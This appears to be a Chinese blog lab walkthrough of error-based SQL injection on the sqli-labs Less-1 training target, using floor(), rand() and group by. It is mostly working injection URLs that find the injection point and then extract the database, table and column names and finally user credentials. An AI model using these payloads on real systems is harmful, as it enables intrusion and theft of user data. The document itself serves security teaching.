+<h1 id="SQL注入-基于报错的注入2"><a href="#SQL注入-基于报错的注入2" class="headerlink" title="SQL注入-基于报错的注入2"></a>SQL注入-基于报错的注入2</h1><p>基于字符型GET注入</p>
+<h2 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h2><p>（1）关于报错注入</p>
+<p>基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。<br>报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。<br>常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。</p>
+<p>（2）关于floor()函数</p>
+<p>在进行报错注入时，floor()函数一般需要与rand()、count()、group by联用。<br>作用：<br>floor(x)：对参数x向下取整；<br>rand()：生成一个0~1之间的随机浮点数；<br>count(*)：统计某个表下总共有多少条记录；<br>group by x：按照（by）一定的规则（x）进行分组；<br>报错原理：floor()函数与group by、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group by将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicate entry ‘…’ for key ‘group_key’。</p>
+<h4 id="寻找注入点-1"><a href="#寻找注入点-1" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>分别使用以下3条payload寻找注入点及判断注入点的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>运行后报错！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>运行后正常显示！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>运行后未正常显示！</p>
+<p>由上述结果可以判断，网站存在字符型注入点。</p>
+<h4 id="获取网站当前所在数据库的库名-1"><a href="#获取网站当前所在数据库的库名-1" class="headerlink" title="获取网站当前所在数据库的库名"></a>获取网站当前所在数据库的库名</h4><p>使用以下payload获取网站当前所在数据库的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为security。注意：请忽略后面的1。</p>
+<h4 id="获取数据库security的全部表名-1"><a href="#获取数据库security的全部表名-1" class="headerlink" title="获取数据库security的全部表名"></a>获取数据库security的全部表名</h4><p>使用以下payload获取数据库security的表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示security库中的第1张表的名字为emails。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112234650983.png" alt="image-20251112234650983" data-caption="image-20251112234650983" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示security库中的第2张表的名字为referers。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112234702542.png" alt="image-20251112234702542" data-caption="image-20251112234702542" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示security库中的第3张表的名字为uagents。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示security库中的第4张表的名字为users。</p>
+<p>以上显示结果中，第4张表users当中可能存放着网站用户的基本信息。</p>
+<h4 id="获取users表的全部字段名-1"><a href="#获取users表的全部字段名-1" class="headerlink" title="获取users表的全部字段名"></a>获取users表的全部字段名</h4><p>使用以下payload获取users表的字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示users表中的第1个字段名字为id。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112234823577.png" alt="image-20251112234823577" data-caption="image-20251112234823577" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示users表中的第2个字段名字为username。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112234853961.png" alt="image-20251112234853961" data-caption="image-20251112234853961" loading="lazy"></p>
+<p>综合以上显示结果，users表中有id、username和password三个字段。</p>
+<h4 id="获取users表id、username和password字段的全部值。-1"><a href="#获取users表id、username和password字段的全部值。-1" class="headerlink" title="获取users表id、username和password字段的全部值。"></a>获取users表id、username和password字段的全部值。</h4><p>由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如</p>
+<p>（1）显示第1组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Dump，Dump。</p>
+<p>（2）显示第2组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Angelina，I-kill-you。</p>
+<p>以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。<br>实验至此结束。</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1765183933820"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A51"><span class="toc-number">1.</span> <span class="toc-text">SQL注入-基于报错的注入1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B1%E4%B8%8A%E8%BF%B0%E7%BB%93%E6%9E%9C%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD%EF%BC%8C%E7%BD%91%E7%AB%99%E5%AD%98%E5%9C%A8%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9%E3%80%82"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">由上述结果可以判断，网站存在字符型注入点。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E5%BD%93%E5%89%8D%E6%89%80%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">获取网站当前所在数据库的库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93security%E7%9A%84%E5%85%A8%E9%83%A8%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">获取数据库security的全部表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E7%9A%84%E5%85%A8%E9%83%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">获取users表的全部字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8id%E3%80%81username%E5%92%8Cpassword%E5%AD%97%E6%AE%B5%E7%9A%84%E5%85%A8%E9%83%A8%E5%80%BC%E3%80%82"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">获取users表id、username和password字段的全部值。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A52"><span class="toc-number">2.</span> <span class="toc-text">SQL注入-基于报错的注入2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E5%BD%93%E5%89%8D%E6%89%80%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%BA%93%E5%90%8D-1"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">获取网站当前所在数据库的库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93security%E7%9A%84%E5%85%A8%E9%83%A8%E8%A1%A8%E5%90%8D-1"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">获取数据库security的全部表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E7%9A%84%E5%85%A8%E9%83%A8%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">2.1.0.4.</span> <span class="toc-text">获取users表的全部字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8id%E3%80%81username%E5%92%8Cpassword%E5%AD%97%E6%AE%B5%E7%9A%84%E5%85%A8%E9%83%A8%E5%80%BC%E3%80%82-1"><span class="toc-number">2.1.0.5.</span> <span class="toc-text">获取users表id、username和password字段的全部值。</span></a></li></ol></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
